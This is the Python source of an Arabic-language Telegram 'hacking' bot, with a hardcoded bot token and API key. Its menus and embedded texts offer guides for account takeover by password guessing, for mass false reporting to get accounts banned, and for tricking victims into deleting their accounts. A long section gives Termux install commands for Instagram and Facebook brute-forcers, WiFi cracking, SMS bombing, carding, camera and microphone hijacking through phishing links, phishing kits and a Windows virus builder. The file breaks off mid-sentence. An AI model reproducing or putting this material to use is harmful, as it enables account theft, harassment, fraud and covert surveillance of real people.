import logging
import requests
from bs4 import BeautifulSoup
import random
import string
import re
import base64
import socket
import threading
import time
from datetime import datetime
import json
import os
import tempfile

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Replace with your bot token
TOKEN = "8729922349:AAGALtZjbmQAmZFx0wEynXK8osEDOAVsG1o"

# Numverify API Key
NUMVERIFY_API_KEY = "8d6ce257e7b6502633705e2330fd0439"

# States for ConversationHandler
(
    CHOOSING_MAIN_MENU,
    GETTING_WEBSITE_URL,
    GETTING_IP_INFO_QUERY,
    GETTING_TELEGRAM_USER_ID,
    GETTING_ROBLOX_USERNAME,
    GETTING_DECORATE_TEXT,
    GETTING_DECRYPT_ROBLOX_SCRIPT,
    GETTING_CHECK_LINK_URL,
    GETTING_PHONE_NUMBER,
    GETTING_EMAIL_ADDRESS,
    GETTING_TEXT_TO_TRANSLATE,
) = range(11)

# Main menu keyboard
main_menu_keyboard = [
    [InlineKeyboardButton("ملفات موقع 🌐", callback_data='website_files'), InlineKeyboardButton("معلومات IP 📍", callback_data='ip_info')],
    [InlineKeyboardButton("إنشاء ايميل 📧", callback_data='generate_email'), InlineKeyboardButton("ادوات اختراق 🛠️", callback_data='hacking_tools')],
    [InlineKeyboardButton("بحث عن مستخدم 🔍", callback_data='search_user'), InlineKeyboardButton("سحب الحافظه 📋", callback_data='clipboard_pull')],
    [InlineKeyboardButton("صوت ضحيه 🎤", callback_data='victim_sound'), InlineKeyboardButton("كيف تصبح هاكر 👨‍💻", callback_data='how_to_be_hacker')],
    [InlineKeyboardButton("فك تشفير سكربتات روبلوكس base64 🔓", callback_data='decrypt_roblox'), InlineKeyboardButton("معلومات حساب روبلوكس 👤", callback_data='roblox_account_info')],
    [InlineKeyboardButton("زخرفه ✨", callback_data='decorate_text'), InlineKeyboardButton("نكته 😂", callback_data='joke')],
    [InlineKeyboardButton("اداة DDOS خفيفه تعليميه 💥", callback_data='ddos_tool'), InlineKeyboardButton("فحص الرابط 🔗", callback_data='check_link')],
    [InlineKeyboardButton("توليد كلمات مرور 🔑", callback_data='generate_password'), InlineKeyboardButton("تعليمات 📜", callback_data='instructions')],
    [InlineKeyboardButton("تحليل رقم الهاتف 📱", callback_data='analyze_phone'), InlineKeyboardButton("تحليل الإيميل 📧", callback_data='analyze_email')],
    [InlineKeyboardButton("شرح استعمال DDOS 🛠️", callback_data='ddos_explain'), InlineKeyboardButton("برومبت ديبسيك 😈", callback_data='deepseek_prompt')],
    [InlineKeyboardButton("فك حظر واتس 📱", callback_data='unblock_whatsapp'), InlineKeyboardButton("اتصال وهمي 📞", callback_data='fake_call')],
    [InlineKeyboardButton("توليد بوت تلي جاهز AI 🤖", callback_data='generate_bot')],
    [InlineKeyboardButton("ترجمة إلى العربية 🌍", callback_data='translate_text'), InlineKeyboardButton("تنزيل فيديوهات تيك توك 🎥", callback_data='download_tiktok')],
    [InlineKeyboardButton("اسم رباعي 🏷️", callback_data='generate_name')],
    [InlineKeyboardButton("رشق تيك و انستا 📈", callback_data='social_boost'), InlineKeyboardButton("ثغرات تيك و انستا 🕳️", callback_data='social_vulnerabilities')],
    [InlineKeyboardButton("ادوات تيرمكس سريه 🖥️", callback_data='termux_tools'), InlineKeyboardButton("ثغرات و بوتات و ادوات تلي 🤖", callback_data='telegram_tools')],
]
main_menu_reply_markup = InlineKeyboardMarkup(main_menu_keyboard)

async def start(update: Update, context) -> int:
    user = update.effective_user
    await update.message.reply_html(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def main_menu(update: Update, context) -> int:
    user = update.effective_user
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

# ======================== ميزة الاسم الرباعي ========================

async def generate_name(update: Update, context) -> None:
    """Generate a random 4-letter name like ABC_X"""
    query = update.callback_query
    await query.answer()
    
    letters = ''.join(random.choices(string.ascii_uppercase, k=3))
    last_letter = random.choice(string.ascii_uppercase)
    name = f"{letters}_{last_letter}"
    
    await query.edit_message_text(
        f"🏷️ **اسم رباعي جديد:**\n\n`{name}`\n\n✅ تم إنشاء الاسم بنجاح!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 إنشاء اسم آخر", callback_data='generate_name')],
            [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
        ])
    )

# ======================== ميزة تنزيل فيديوهات تيك توك ========================

async def download_tiktok(update: Update, context) -> None:
    """Show TikTok download instructions"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🎬 **تنزيل فيديوهات تيك توك بدون علامة مائية**\n\n"
        "📌 أرسل رابط الفيديو من تيك توك وسأقوم بتحميله لك مباشرة!\n\n"
        "📝 مثال: https://www.tiktok.com/@username/video/123456789\n\n"
        "✅ سيتم إرسال الفيديو بدون علامة مائية",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def handle_tiktok_download(update: Update, context) -> None:
    """Download TikTok video without watermark"""
    url = update.message.text.strip()
    
    tiktok_pattern = r'https?://(?:www\.|vm\.|vt\.)?tiktok\.com/[^\s]+'
    
    if not re.search(tiktok_pattern, url):
        return
    
    try:
        processing_msg = await update.message.reply_text("⏳ جاري تحميل الفيديو...")
        
        response = requests.post(
            "https://tikwm.com/api/",
            data={"url": url},
            timeout=30
        )
        
        if response.status_code != 200:
            await processing_msg.delete()
            await update.message.reply_text(
                "❌ عذراً، تعذر الاتصال بخدمة التحميل. حاول مرة أخرى.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
            )
            return
        
        data = response.json()
        
        if "data" not in data or not data["data"]:
            await processing_msg.delete()
            await update.message.reply_text(
                "❌ عذراً، تعذر تحميل الفيديو. تأكد من الرابط وحاول مرة أخرى.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
            )
            return
        
        video_data = data.get("data", {})
        video_url = video_data.get("hdplay") or video_data.get("play")
        
        if not video_url:
            await processing_msg.delete()
            await update.message.reply_text(
                "❌ عذراً، لم يتم العثور على فيديو في هذا الرابط.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
            )
            return
        
        title = video_data.get("title", "فيديو تيك توك")
        author = video_data.get("author", {}).get("unique_id", "مستخدم غير معروف")
        duration = video_data.get("duration", "غير معروف")
        
        await processing_msg.delete()
        
        await update.message.reply_video(
            video=video_url,
            caption=f"🎬 **فيديو تيك توك**\n\n📌 {title[:100]}\n👤 @{author}\n⏱️ المدة: {duration} ثانية\n\n✅ تم التحميل بدون علامة مائية",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تنزيل فيديو آخر", callback_data='download_tiktok')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
        
    except requests.exceptions.Timeout:
        await processing_msg.delete()
        await update.message.reply_text(
            "⏰ انتهى وقت الانتظار. الخادم بطيء، حاول مرة أخرى.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
    except Exception as e:
        await processing_msg.delete()
        await update.message.reply_text(
            f"⚠️ حدث خطأ غير متوقع: {str(e)[:100]}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

# ======================== ميزة الترجمة ========================

async def translate_text(update: Update, context) -> int:
    """Ask user for text to translate"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🌍 الرجاء إرسال النص الذي تريد ترجمته إلى العربية:\n\nمثال: Hello, how are you?",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )
    return GETTING_TEXT_TO_TRANSLATE

async def get_translation(update: Update, context) -> int:
    """Translate text to Arabic using Google Translate API directly"""
    text = update.message.text.strip()
    
    if not text:
        await update.message.reply_text(
            "❌ الرجاء إرسال نص صحيح للترجمة.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        return GETTING_TEXT_TO_TRANSLATE
    
    try:
        url = "https://translate.googleapis.com/translate_a/single"
        params = {
            "client": "gtx",
            "sl": "auto",
            "tl": "ar",
            "dt": "t",
            "q": text
        }
        
        response = requests.get(url, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            translated_text = ""
            for item in data[0]:
                if item[0]:
                    translated_text += item[0]
            detected_lang = data[2] if len(data) > 2 else "غير معروف"
        else:
            url2 = "https://api.mymemory.translated.net/get"
            params2 = {
                "q": text,
                "langpair": "auto|ar"
            }
            response2 = requests.get(url2, params=params2, timeout=10)
            response2.raise_for_status()
            data2 = response2.json()
            translated_text = data2.get("responseData", {}).get("translatedText", "حدث خطأ في الترجمة")
            detected_lang = data2.get("responseData", {}).get("detectedSourceLanguage", "غير معروف")
        
        result = f"""
🌍 **الترجمة إلى العربية**

📝 **النص الأصلي:**
{text}

🔤 **اللغة الأصلية:** {detected_lang}

📖 **الترجمة:**
{translated_text}
"""
        
        await update.message.reply_text(
            result,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 ترجمة نص آخر", callback_data='translate_text')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"⚠️ حدث خطأ أثناء الترجمة: {e}\nالرجاء المحاولة مرة أخرى.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إعادة المحاولة", callback_data='translate_text')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
    
    return CHOOSING_MAIN_MENU

# ======================== الأزرار الجديدة ========================

async def social_boost(update: Update, context) -> None:
    """روابط رشق تيك و انستا"""
    query = update.callback_query
    await query.answer()
    
    text = """
الموقع الاول::

 https://zefoy.com/

الموقع الثاني::

https://froyz.com/

https://zyadat.com/
https://followadd.com
smmcpan.com
seoclevers.com
followergi.com
seorrs.com
https://drd3m.com

https://igtools.me/live

رابط رشق قنوات تلي 
https://en.mrpopular.net/get-free-telegram-subscribers.php

https://igtor.com/Story

روابط رشق تيك توك 👇🏻.. 
https://zefoy.com

https://tikfollowers.com/tiktok-free-followers
------------------------------------------------------

e_lx:
روابط رشق انستا


روابط رشق انستا 👇🏻
https://igtools.ooo/
https://igtor.com/
https://igpro.me/
https://igsub.me/
https://sifresiz.instahile.co/story-views
https://freer.in/?r=home
-----------------------------------------------------
 👇🏻رابط يرشق انستا 150  متابع 
https://i.anindabegeni.com/

Igtools.ooo
424. 
425. Instagramyl.weebly.com
426. 
427. https://www.instaore.com/tools
428. 
429. http://takipciyurdu.com/tags/takipci-gonder
430. 
431. https://instagramtakiphilesi.com/
432. 
433. https://instagram.sosyalmedya.store/takipci/
434. 
435. https://takipmerkezi.com.tr/
436. 
437. https://takipcihilecin.com/tools
438. 
439. https://takipci.instager.net/
440. 
441. https://takipcipanelim.com/
442. 
443. https://www.popileriz.com/tools
444. 
445. https://www.instaloji.com/
446. 
447. https://takipci.instager.net/blog/instagram-sifresiz-takipci-hilesi
448. 
449. https://takipcisitelerin.com/
450. 
451. http://instagrambegenin.com/tools
452. 
453. https://www.instafenomeni.net/tools
454. 
455. http://instabayim.com/
456. 
457. https://www.insfollow.com/tags/instagram-takipci-gonder
458. 
459. https://takipapp.com/
460. 
461. https://sosyalmedyakazan.com/
462. 
463. https://www.instaore.com/tools
464. 
465. http://takipciyurdu.com/tags/takipci-gonder
466. 
467. https://www.takipcipanelim.com/tools
468. 
469. https://maxtakipci.com/tools
470. 
471. http://instagrambegenin.com/
472. 
473. https://www.instaloji.com/tools
474. 
475. https://www.instatakipcibegeni.net/tools
476. 
477. https://takipcicenter.com/tools
478. 
479. http://hepinsta.com/
480. 
481. https://instagram.takipcisitelerin.com/
482. 
483. https://www.takipcibegenigonder.com/
484. 
485. https://mediainsta.com/
486. 
487. https://www.silvertakipci.com/
488. 
489. https://insfollow.com/tools
490. 
491. http://www.seononline.com/tools
492. 
493. https://instatakipmerkezi.com/
494. 
495. https://takipmerkezi.com.tr/blog/instagram-takipci-gonder-firsatlari
496. 
497. https://www.mediainsta.com/tools
498. 
499. https://takipcilerbizden.com/tools

500. 
501. https://4takip.com/
502. 
503. https://begendiler.com/
504. 
505. https://silvertakip.net/tools
506. 
507. https://www.xtakipci.net/
508. 
509. https://takipsi.com/
510. 
511. https://vipinstagramtakipci.com/
512. 
513. https://ibegenapp.com/
514. 
515. http://igtakip.win/
516. 
517. https://instagram.begenin.net/
518. 
519. https://takipcisepeti.com/tools
520. 
521. https://www.silvertakipci.com/
522. 
523. https://insfollow.com/tools
524. 
525. https://silverbegeni.com/
526. 
527. https://instagramhilecim.com/tools
528. 
529. https://www.begensinler.com/
530. 
531. https://takipcistar.com/tools
532. 
533. http://silvertakip.com/
534. 
535. https://vipinstagramtakipci.com/tools
536. 
537. https://takipci1.com/tools
538. 
539. https://www.takipcipro.com/tools
540. 
541. https://instagramtakiphilesi.com/instagram-begeni-paneli/index.html
54

2. 
543. http://takipciyurdu.com/
544. 
545. https://begendiler.com/
546. 
547. https://www.instafenomeni.net/
548. 
549. https://instakipci.pro/
550. 
551. https://insmobil.com/
552. 
553. https://ibegenapp.com/tools
554. 
555. https://v3sc.tk/Instagram-Sifresiz-Takipci
556. 
557. https://instahilesiapp.com/tools
558. 
559. http://trendsosyal.com/instagram.php
560. 
561. https://takipciaraci.com/tools
562. 
563. https://i.sosyaltechs.com/tools
564. 
565. https://www.seononline.com/
566. 
567. https://tektakipci.com/tools
568. 
569. http://www.enginuzun.org/baskasina-takipci-gonderme-baska-hesaba-begeni-gonder.html
570. 
571. https://www.takipsosyal.com/
572. 
573. http://www.hepinsta.com/tools/send-follower
574. 
575. https://instagram.takipcisatinal.com.tr/tag/instagram-takipci-gonder/
576. 
577. http://begenipaneli.net/tools
578. 
579. https://silverbegeni.com/tools
580. 
581. https://sosyalmedyakazan.com/tools
582. 
583. https://instagramtakiphilesi.com/instagram-begeni-paneli/index.html
584. 
585. http://takipciyurdu.com/
586. 
587. https://www.youtube.com/watch?v=10tqMjwDTNE
588. 
589. https://instavevo.com/tools
590. 
591. https://iyitakipci.com/tools
592. 
593. https://www.instagramozel.com/

👇🏻رابط يرشق انستا 150  متابع 
https://i.anindabegeni.com/
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def social_vulnerabilities(update: Update, context) -> None:
    """ثغرات تيك و انستا"""
    query = update.callback_query
    await query.answer()
    
    text = """
روح لحساب الي تريد تبنده وبلغ على كل تعاليقه خطاب كراهيه وراهه روح على الفيدوات تشد عليهم كلهم تحرش او تنمر-شخص اعرفه /بعدين روح شد على الحساب وره ما يبلع انتهاك شد 10 مزعج و10 تحرش او تنمر شخص اعرفه (على الحساب

طريقه ثانيه 

اول خطوه تروح الحساب ضحيه
تبلغ ع كل الفيديوهات تنطي خطاب كراهي وبعدهه تروح تنطي ابلاغ ع حساب وتنطي آخر وتلصق هاذا الكود 

 дравствуйте, компания tik, пожалуйста, забаньте мне этот аккаунт, потому что он публикует ложные новости, а их подлинность не была доказана.

ثغره حذف حساب ( تيك توك )

( i,m 7 ) لنسخ الكود

طريقة استخدام 

*تقنع الضحيه عود هو كود لرشق
*قنعه يحطه بل نبذة (بايو) 
*خلال 3 ثواني ينحذف

صيد فرنسي موثق🙄

اول شي افتح vpn ع فرنسا وبحث موثق اخر فديو لة 2018 بعدين خش علية وحط اباس زي يوزر😳🇫🇷 اهم شي انتبه لا يكون في تحقق 🤔🌿

ذي برايفت


ثغرة الموثق

اول شي تبحث بالبحث حق قوقل عن famous Indian names او popular Indian names و تاخذ من هناك اسم و تروح بحث التيك تحط الاسم تدور في الحسابات مثلا لقيت يوزر كذا soldos52 تاخذه و تروح تسجيل دخول و تحط الباس هو اليوزر اذا ما ضبط مرات يكون الاسم الي فوق Soldos بدون الارقام و مرات مع الارقام برضو تجرب الباس و الثغره يحتاج لها صمله

ثغره المزغرف
تروح البحث تكتب كتابه مزغرف
تشوف يوزر تقدر تخمن الباس بس نسبت 30% ما يضبط
تشوف الاسم الفوق إذا أكثر من 6احرف تنسخه إذا مسوين عليه حساب جيميل تروح تسوي حساب إذا ضبط تروح تسوي نسيت كلمت السر بعده تحط كلمت السر الجديده ومبروك



ثغره رباعي تيك توك

تروح للبحث

تكتب اي رباعي

كون مصفر متابعين ومابي صوره

تروح تكتب بل كوكل باسوردات مشهورة

وتجرب علية

وراح يضبط %100

اذا ما ضبط جرب غيرة

안녕하세요 틱톡은 모든 방송법과 회사법을 위반하고, 마약과 폭력적이고 폭력적인 발언을 조장하고 살인과 폭력을 선동하는 테러리스트의 방송을 모욕하는 방법을 팔로워들에게 가르치는 분입니다. 방송을 삭제 해주세요. 감사합니다


طيرو فيه البثوث المخالفه فقط ♥️

ثغرة سحب حسابات عالية
تكتب iraq بل عراق لو tty


تبحث حسابات عالية

يكون اليوزر هيج kdksowoeoie38

والاسم نفس يوزر

تذهب الا نسيت كلمه سر

اذا الايميل طلع متسجل

تذهب للجميل تسوي ايميل بي وتسحبة
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def termux_tools(update: Update, context) -> None:
    """ادوات تيرمكس سريه"""
    query = update.callback_query
    await query.answer()
    
    text = """
باستخدام هذه الأداة، يمكنك فرض هجوم عنيف على فيس بك Facebook، وتثبيت أداة اختراق واي فاي Wifi وتثبيت أدوات إعداد تريمكس  ويمكنك تثبيت سمة Tarmux في جهازك بسهولة وبدون اي مشاكل 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑 
----------------------------

apt update && apt upgrade -y

pkg install git

pkg install python

rm -rf ALL-IN-ONE

git clone --depth=1 https://github.com/U7P4L-IN/ALL-IN-ONE.git

cd ALL-IN-ONE

python3 ALL.py

اداة فحص المواقع للعثور على ثغرة اكس اس اس Xss
هاذي الاداه مصممه للعثور عن المواقع المصابه بهاذي الثغره
طرريقة التشغيل على تطبيق تريمكس 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

$ git clone https://github.com/Emoe/kxss

$ cd kxss 

$ apt install golong -y 

#go build main.go 

$ mv main /bin/xss

$ apt install getallurls

هاذي الاداه يمكنك عبرها اختراق فيس وجيميل وانستغرام وتويتر فقط جيد استخدامها وتشتغل بدون اي مشاكل شغال على تطبيق تريمكس 
#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

$ pkg update && pkg upgrade -y

$ apt-get install git

$ git clone https://github.com/TunisianEagles/SocialBox.git

$ cd SocialBox

$ chmod +x SocialBox.sh

$ chmod +x install-sb.sh

$ bash install-sb.sh 

$ bash SocialBox.sh

e_lx:
| 10 ادوات في اداة واحدة |


أدوات الكل في واحد [أفضل 10 أدوات اختراق]🔰

الكل في واحد [10 أدوات] يمكن أن يعمل على أجهزة مختلفة لأنه برنامج متعدد الأغراض. باستخدام هذه الأداة، يمكنك فرض هجوم عنيف على فيسبوك، وتثبيت أداة اختراق Wifi، وتثبيت أدوات إعداد Tarmux، ويمكنك تثبيت سمة Tarmux في جهازك بسهولة فقط عبر تريمكس 
#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

apt update && apt upgrade -y

pkg install git

pkg install python

rm -rf ALL-IN-ONE

git clone --depth=1 https://github.com/U7P4L-IN/ALL-IN-ONE.git

cd ALL-IN-ONE

python3 ALL.py

أداة لجمع معلومات الضحية عبر بروتوكول الإنترنت مع ميزة إظهار رقم الهاتف التثبيت على  تريمكس 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------

$- apt update

$- pkg install python3

$- pkg install python

$- pip install requests

$- pip install render

$- pip install time

$- pip install bs4

$- pip install uuid

$- pip install random

$- pkg install git

$- git clone https://github.com/AlmunharifHamoudi/ip.git

$- cd ip

$- python ip.py

⌯ اداة اختراق شبكات الوايفاي عبر  تريمكس 

• مميزات الاداه كتالي 
1) بدء وضع المراقبة
2) إيقاف وضع المراقبة
3) فحص الشبكات
4) الحصول على مصافحة (Handshake)
5) إنشاء قائمة كلمات مرور
6) تثبيت أدوات الشبكات اللاسلكية
7) هجمات على شبكات WPS
8) فحص شبكات WPS
9) كسر المصافحة باستخدام rockyou.txt
10) كسر المصافحة باستخدام قائمة كلمات المرور
11) كسر المصافحة بدون قائمة كلمات المرور

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------

$- apt update 
 
$- apt install git 

$- apt install python

$- apt install python3
 
$- apt install cmatrix

$- rm -rf WIFI-HACKING

$- git clone --depth=1 https://github.com/U7P4L-IN/WIFI-HACKING.git

$- cd WIFI-HACKING

$- ls

$- python WIFI.py

عبر هاذي الاداه يمكنك عمل فيزات مشحونه عبر تريمكس 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------

1- apt update 

2- apt upgrade 

3- apt install git 

4- git clone https://github.com/INDOnimous/Card-Number

5- ls

6- cd Card-Number

7- ls 

8- chmod +x *

9- ls

10- sh Card.sh

عبر هاذي الاداه يمكنها ان ترسل كمية هائلة من الرسائل النصية القصيرة والمكالمات إلى هدف واحد

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

pkg update

pkg install python3 python3-pip git -y

git clone https://github.com/LimerBoy/Impulse

cd Impulse/

pip3 install -r requirements.txt

python3 impulse.py --help

هاذي الاداه لتتبع شخص ما التشغيل على  تريمكس 

التعليمات 👇
IP Tracker : لتتبع عنوان IP الخاص بشخص ما
إظهار IP الخاص بك : لرؤية عنوان IP الخاص بك
تعقب الهاتف : لتتبع رقم هاتف شخص ما
تعقب اسم المستخدم : لتتبع الأشخاص بالاسم
خروج : للخروج من الأدوات

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------
$ apt update

$ apt upgrade

$ pkg install git

$ pkg install python

$ pkg install python3

$ git clone https://github.com/Whomrx666/Xtracking.git

$ cd Xtracking
 
$ pip install -r requirements.txt

$ python3 Xtracking.py

200 اداه بداخل اداه واحده 
هاذي الأدوات مهمه جداً ب القرصنه والتلاعب والكثير من الاشياء الذي قد تجدها بداخلها 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑 
------------------------------------

$ apt update && apt upgrade -y

$ apt install git

$ apt install php

$ apt install curl

$ apt install ruby

$ apt install figlet

$ apt install python2

$ gem install lolcat

$ git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv3

$ cd TOOLSINSTALLERv3

$ chmod +x TUANB4DUT.sh

$ sh TUANB4DUT.sh


----------------   ------------------

اداه اختراق كاميرا الضحيه + تسجيل صوت للضحيه عن طريق لينك

$- apt-get update -y

$- apt-get upgrade -y

$- pkg install git -y

$- pip install lolcat

$- git clone https://github.com/Expert-Hacker/E-TOOL.git

$- cd E-TOOL

$- bash setup.sh

• بعد انتهاء التثبيت لو عايز تخترق الكاميرا هتكتب الاوامر التالية
$- ls

$- cd voice

$- bash camera.sh

• هتسيبو يحمل بعدها هتختار السرفر اختار ال انت عيزو 1 او 2 لو طلب منك (Y/N) اختار Y بعدها هتكتب الرقم ال هيكون موجود قودامك ال هيطلبو بعدها تسيبو يحمل هيديك لينك ابعتو للضحيه وخليه يديلو الاذونات وبس كده

• لو عايز تسجل صوت للضحيه اكتب الاوامر التاليه

• لو لسه ف مجلد camera اكتب 

$- cd ..

• الامر ال فوق ده للرجوع لو انت لسه مش فاهم 

$- cd voice

$- bash voice.sh

• وهتنفذ نفس ال فوق عادي وبس كده.

ادوات اختراق انستا تريمكس 

pkg install python2

pkg install python

pkg install git

pkg install python2 git -y

pip2 install requests

pip2 install bs4

git clone https://github.com/TERMUXID3/instabrute

cd instabrute

chmod +x *

python2 instabrute.py

أداة تريمكس  لاستخراج أرقام هنديه عشوائيه 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------

$  apt update

$  apt install git

$ apt install python

$ apt install python3

$  git clone https://github.com/BlackFoxTM/tracenum

$  cd tracenum

$  pip3 install -r requirements.txt

$  python3 main.py

أداة القرصنة الألبانيه!! أدوات لمساعدتك في القرصنه الأخلاقيه، واختراق وسائل التواصل الاجتماعي، ومعلومات الهاتف، وهجوم Gmail، والهجوم على رقم الهاتف، واكتشاف المستخدم، والرسائل القصيره المجهوله واختراق كاميرا الويب • أداه قويه لهجوم DDOS!! فقط على تريمكس

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------


pkg install git

git clone https://github.com/4lbH4cker/ALHacking

cd ALHacking

bash alhack.sh

تُستخدم هذه الأداة المسماة W0rm-GPT بشكل أساسي للبحث في جميع الأنشطة التي لا يمكن لـ ChatGPT تقديمها، وجميع واجهات برمجة التطبيقات العاملة موجودة في البرنامج النصي فقط كمساعده وذكاء اصطناعي على تطبيق  تريمكس 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------

pkg up -y

pkg install git wget python -y

git clone https://github.com/samay825/W0rm-Gpt

cd W0rm-Gpt

pip install -r requirements.txt

python3 main.py

اختراق الكاميرا اداة HACK-CAMERA، أداة جديدة لالتقاط الصور. على عكس الآخرين الذين يستخدمون servero وngrok، فإن HACK-CAMERA يجعل الأمور أسهل. يستخدم الكثير من الأشخاص ngrok، لكن لا يعرف الجميع السيرفيو جيدًا. عندما تقوم بمشاركة رابط ngrok، فإنه يظهر تحذيرًا، مما يجعله واضحًا. ولكن مع خيار الارتباط السحابي الخاص بـ HACK-CAMERA، لا توجد تحذيرات. لذلك، استخدم الأداة بحرية دون القلق بشأن التنبيهات، تمامًا مثل الأدوات الأخرى. التثبيت على  تريمكس 

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
------------------------------------
apt update && apt upgrade -y

apt install git -y

apt install curl -y

apt install wget -y

git clone https://github.com/XPH4N70M/HACK-CAMERA.git

cd HACK-CAMERA

bash setup

bash hack_camera.sh

أداة تصيد تلقائية وسهلة الاستخدام للمبتدئين تحتوي على أكثر من 30 نموذجًا. تستخدم على  تريمكس

#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

$ cd Xphisher

$ chmod 777 Xphisher.sh

$ bash Xphisher.sh

$ git clone https://github.com/Whomrx666/Xphisher.git

اوامر اداه AMF1لعمل تلغيم صوره لسحب الip :
#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

1- pkg install python

2- pkg install git

3- git clone https://github.com/abdalkreemafm/AMF1

4- ls

5- cd AMF1

6- chmod +x AMF1.py

7- python AMF1.py

بعد كذا تكتب رقم 1 وتدوس انتر

منشئ الفيروسات. هي أداة من محطة termux.
ستقوم هذه الأداة بإنشاء فيروس يمكنه فقط تدمير جهاز الكمبيوتر الذي يعمل بنظام Windows. يمكنك أيضًا تكوين التشغيل التلقائي في محرك أقراص USB

التثبيت على تطبيق  
